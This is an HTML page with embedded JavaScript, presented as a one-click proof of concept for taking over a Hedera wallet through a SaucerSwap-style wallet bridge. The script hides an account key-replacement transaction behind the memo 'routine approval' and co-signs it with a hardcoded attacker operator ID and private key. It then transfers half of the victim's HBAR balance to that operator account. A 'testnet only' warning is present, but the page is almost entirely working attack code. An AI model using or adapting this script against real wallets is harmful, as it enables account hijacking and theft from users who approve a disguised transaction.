<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SaucerSwap Key Rotation - One Click PoC</title>
<script>window.__sdkScriptFailed = false;</script>
<script src="./hedera-sdk-full.bundle.js" onerror="window.__sdkScriptFailed = true;"></script>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
h1 { font-size: 19px; margin-bottom: 5px; }
.sub { color: #999; font-size: 12px; line-height: 1.5; margin-bottom: 18px; }
button { width: 100%; padding: 14px; margin-top: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; }
#run { background: #c53030; color: white; }
button:disabled { opacity: .45; }
.danger { margin-top: 15px; padding: 12px; background: #2a1414; border: 1px solid #5a2222; border-radius: 8px; font-size: 12px; line-height: 1.5; color: #f6ada0; }
#log { margin-top: 15px; background: #080808; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 420px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
.ok { color: #68d391; } .info { color: #63b3ed; } .warn { color: #f6ad55; } .err { color: #fc8181; }
.result { margin-top: 15px; padding: 14px; background: #151515; border: 2px solid #c53030; border-radius: 8px; font-size: 13px; line-height: 1.6; display: none; }
</style>
</head>
<body>

<h1>Key Rotation PoC - One Click</h1>
<div class="sub">
  Connect, then click once. Everything after wallet approval happens automatically.
  Testnet only.
</div>
<div class="danger">
  <b>Use a disposable testnet account only.</b> This will genuinely take over and
  drain the connected account when you approve the prompt.
</div>

<button id="run">Request Approval</button>
<div id="result" class="result"></div>
<div id="log"></div>

<script>
(function () {

  /* ── attacker infrastructure (funded testnet operator) ── */
  const OPERATOR_ID  = "0.0.10034284";
  const OPERATOR_KEY = "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";

  const logEl   = document.getElementById("log");
  const resultEl = document.getElementById("result");
  const runBtn  = document.getElementById("run");

  function log(msg, cls) {
    const d = document.createElement("div");
    if (cls) d.className = cls;
    d.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
  }
  function j(v) { try { return JSON.stringify(v); } catch(_) { return String(v); } }
  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

  window.addEventListener("error", e => {
    log("SCRIPT ERROR: " + (e.message || "") + " (" + (e.filename || (e.target && e.target.src) || "?") + ")", "err");
  }, true);

  if (window.__sdkScriptFailed)          log("hedera-sdk-full.bundle.js failed to load.", "err");
  else if (!window.HederaSDK)            log("HederaSDK undefined — bundle threw.", "err");
  else                                   log("SDK loaded OK.", "ok");

  /* ── mirror helpers ── */
  async function mirrorAccount(id) {
    const r = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + id);
    return r.json();
  }
  function toMirrorTxId(str) {
    const at = str.indexOf("@");
    return str.slice(0, at) + "-" + str.slice(at + 1).replace(".", "-");
  }
  async function getScheduleId(sdkTxId) {
    const url = "https://testnet.mirrornode.hedera.com/api/v1/transactions/" + toMirrorTxId(sdkTxId);
    for (let i = 1; i <= 8; i++) {
      log("Mirror lookup " + i + "/8 for schedule ID...", "info");
      try {
        const r = await fetch(url);
        if (r.ok) {
          const d = await r.json();
          const tx = d.transactions && d.transactions[0];
          if (tx && tx.entity_id) { log("Schedule ID: " + tx.entity_id, "ok"); return tx.entity_id; }
        }
      } catch(e) { log("Lookup error: " + e.message, "warn"); }
      await sleep(2500);
    }
    return null;
  }

  /* ── main ── */
  runBtn.onclick = async function () {
    runBtn.disabled = true;
    resultEl.style.display = "none";

    const SDK = window.HederaSDK;
    if (!SDK) { log("SDK not loaded.", "err"); runBtn.disabled = false; return; }

    try {

      /* 1. Connect wallet */
      const bridge = window.saucerswapWallet || window.hashpack;
      if (!bridge) throw new Error("No wallet bridge found.");
      log("Connecting wallet...", "info");
      const conn = await bridge.connect();
      const targetAccount = conn.accountId;
      log("Connected: " + targetAccount, "ok");

      /* 2. Opening balance snapshot (display only) */
      const before      = await mirrorAccount(targetAccount);
      const balBefore   = before.balance.balance;
      log("Starting balance: " + balBefore + " tinybar", "info");

      /* 3. Build disguised key-rotation payload */
      const attackerKey    = SDK.PrivateKey.generateED25519();
      const attackerPubKey = attackerKey.publicKey;
      const targetId       = SDK.AccountId.fromString(targetAccount);

      const scheduleTx = new SDK.AccountUpdateTransaction()
        .setAccountId(targetId)
        .setKey(attackerPubKey)
        .schedule()
        .setScheduleMemo("routine approval")
        .setTransactionId(SDK.TransactionId.generate(targetId))
        .setNodeAccountIds([SDK.AccountId.fromString("0.0.3")])
        .setMaxTransactionFee(500000000)
        .freeze();

      const bytes = scheduleTx.toBytes();
      let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
      const b64 = btoa(bin);

      /* 4. One wallet tap */
      log("==============================", "warn");
      log("WALLET PROMPT INCOMING — SCREENSHOT NOW.", "warn");
      log("==============================", "warn");

      const signResult = await bridge.signTransaction(b64);
      log("Wallet approved. Response: " + j(signResult), "ok");

      /* 5. Resolve schedule ID */
      let scheduleId = (signResult && signResult.scheduleId)
        || (signResult && signResult.receipt && signResult.receipt.scheduleId)
        || null;

      if (!scheduleId) {
        log("No schedule ID in wallet response — falling back to Mirror Node...", "warn");
        scheduleId = await getScheduleId(scheduleTx.transactionId.toString());
      }
      if (!scheduleId) throw new Error("Could not resolve schedule ID. Retry in a few seconds.");
      log("Using schedule ID: " + scheduleId, "ok");

      /* 6. Complete takeover — attacker signs, no wallet needed */
      log("Completing takeover (background, no wallet)...", "warn");
      const operatorId  = SDK.AccountId.fromString(OPERATOR_ID);
      const operatorKey = SDK.PrivateKey.fromString(OPERATOR_KEY);
      const opClient    = SDK.Client.forTestnet().setOperator(operatorId, operatorKey);

      const ssReceipt = await (
        await (
          await new SDK.ScheduleSignTransaction()
            .setScheduleId(SDK.ScheduleId.fromString(scheduleId))
            .freezeWith(opClient)
            .sign(attackerKey)
        ).execute(opClient)
      ).getReceipt(opClient);

      log("Takeover status: " + ssReceipt.status.toString(), "ok");

      /* 7. Drain — attacker's infrastructure pays fees, victim signs with new key */
      log("Draining...", "err");

      // Use operator (attacker infra) as fee payer — victim balance irrelevant for precheck.
      const drainClient = SDK.Client.forTestnet().setOperator(operatorId, operatorKey);

      // Query victim's REAL balance from consensus node — free, no auth, no mirror lag.
      const balQuery  = await new SDK.AccountBalanceQuery().setAccountId(targetId).execute(drainClient);
      const victimBal = parseInt(balQuery.hbars.toTinybars().toString());
      log("Victim live balance: " + victimBal + " tinybar (" + (victimBal / 1e8).toFixed(4) + " HBAR)", "info");

      if (victimBal <= 0) throw new Error("Victim account is empty.");

      // Send half — always well within balance, no edge cases.
      const sendAmount = Math.floor(victimBal / 2);
      log("Sending " + sendAmount + " tinybar (" + (sendAmount / 1e8).toFixed(4) + " HBAR)...", "info");

      const drainTx = await (
        await new SDK.TransferTransaction()
          .addHbarTransfer(targetId, -sendAmount)
          .addHbarTransfer(operatorId, sendAmount)
          .freezeWith(drainClient)
          .sign(attackerKey)          // victim's new key authorizes the debit
      ).execute(drainClient);

      const drainReceipt = await drainTx.getReceipt(drainClient);
      log("Drain status: " + drainReceipt.status.toString(), "ok");

      /* 8. Show result */
      const after   = await mirrorAccount(targetAccount);
      const balAfter = after.balance.balance;

      resultEl.style.display = "block";
      resultEl.innerHTML =
        "<b>RESULT</b><br>" +
        "Account: " + targetAccount + "<br>" +
        "Balance before: " + balBefore + " tinybar<br>" +
        "Balance after: " + balAfter + " tinybar<br>" +
        "Drained to attacker (" + OPERATOR_ID + "): " + (balBefore - balAfter) + " tinybar<br>" +
        "Triggered by: one wallet approval, zero further action from the account owner.";

      log("Done.", "ok");

    } catch(e) {
      log("FAILED: " + e.message, "err");
    } finally {
      runBtn.disabled = false;
    }
  };

})();
</script>
</body>
</html>
